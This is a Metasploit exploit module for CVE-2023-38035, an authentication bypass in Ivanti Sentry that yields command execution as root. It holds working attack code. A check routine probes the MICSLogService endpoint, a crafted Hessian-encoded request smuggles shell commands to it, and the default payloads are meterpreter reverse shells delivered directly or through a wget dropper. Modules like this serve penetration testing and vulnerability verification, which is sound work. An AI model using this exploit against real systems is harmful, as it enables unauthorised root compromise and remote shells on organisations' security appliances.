##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'Ivanti Sentry Misc Log Service',
        'Description' => %q(
          This module exploits an authentication bypass in Ivanti Sentry which exposes API functionality which
          allows for code execution in the context of the root user.
        ),
        'Author'      =>
          [
            'Zach Hanley',    # Discovery & PoC
            'James Horseman', # Discovery & PoC
            'jheysel-r7'      # Msf module
          ],
        'References'  =>
          [
            [ 'URL', 'https://github.com/horizon3ai/CVE-2023-38035'],
            [ 'CVE', '2023-38035']
          ],
        'License'        => MSF_LICENSE,
        'DefaultOptions' => {
          'RPORT' => 8443,
          'SSL' => true
        },
        'Platform'       => ['unix', 'linux'],
        'Privileged'     => false,
        'Arch'           => [ ARCH_CMD,ARCH_X64 ],
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => ['unix', 'linux'],
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/linux/http/x64/meterpreter_reverse_tcp'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :linux_dropper,
              'DefaultOptions' => {
                'CMDSTAGER::FLAVOR' => :wget,
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2023-08-21',
        'Notes'           =>
          {
            'Stability'   => [ CRASH_SAFE, ],
            'SideEffects' => [ ARTIFACTS_ON_DISK, ],
            'Reliability' => [ REPEATABLE_SESSION, ],
          },
        )
    )

    # register_options(
    #   [
    #
    #   ],
    # )
  end

  def check
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, '/mics/services/MICSLogService'),
      'method' => 'GET'
    )

    return Exploit::CheckCode::Unknown('The target did not respond to the vulnerable endpoint') unless res
    return Exploit::CheckCode::Safe("The target responded with a: #{res.code}. A vulnerable instance should respond with a 405") unless res.code == 405

    Exploit::CheckCode::Appears
  end

  def execute_command(cmd, _opts = {})
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    exploit_header = "c\x01\x00m\x00\x18uploadFileUsingFileInputMS\x00\x07commandS\x00"
    exploit_footer = "S\x00\x06isRootTzNz"

    cmd.split('; ').each do |c|

      vprint_status('Command: ' + c)
      vprint_status("Command length: #{c.length.to_s(16)}")
      data = exploit_header + [c.length].pack('C')  + c + exploit_footer
      print_status('Data: ' + data)
      res = send_request_raw(
        'uri' => normalize_uri(target_uri.path, '/mics/services/MICSLogService'),
        'method' => 'POST',
        # 'headers' => {
        #   'Content-Type' => 'application/x-hessian'
        # },
        'data' => data
      )
      sleep(5)
    end
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager
    end
  end
end